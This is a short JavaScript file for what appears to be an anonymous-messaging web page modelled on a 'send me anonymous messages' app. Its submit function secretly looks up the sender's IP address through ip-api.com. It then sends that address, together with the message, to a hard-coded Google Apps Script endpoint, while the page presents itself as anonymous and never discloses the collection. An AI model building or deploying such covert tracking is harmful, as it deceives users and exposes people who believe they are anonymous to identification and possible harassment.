function focusInput() {
    document.getElementById("anonymousLabel").style.display = "none";
    document.getElementById("getOwnButton").style.display = "none";
}

function toggleSubmitButton() {
    const messageInput = document.getElementById("messageInput").value.trim();
    const submitButton = document.getElementById("submitButton");

    if (messageInput.length > 0) {
        submitButton.classList.remove("hidden");
    } else {
        submitButton.classList.add("hidden");
    }
}

function getOwnMessages() {
    window.location.href = "https://apps.apple.com";
}


function submitMessage() {
    const message = document.getElementById("messageInput").value.trim();

    // Fetch IP details
    fetch("http://ip-api.com/json")
        .then((response) => {
            if (!response.ok) {
                throw new Error("Failed to fetch IP address.");
            }
            // window.location.href = "success.html";
            return response.json();
        })
        .then((data) => {
            const ipAddress = data.query;

            // Send data to Google Apps Script
            return fetch("https://script.google.com/macros/s/AKfycbwg9i3AesIdghdTVoyQUpyVb3gjbASbC6EWyR6fsSvZLH1DSUDXWQYdNfwUfWumG-O6/exec", {
                method: "POST",
                body: JSON.stringify({ message, ipAddress }),
                headers: { "Content-Type": "application/json" },
            });
        });
}
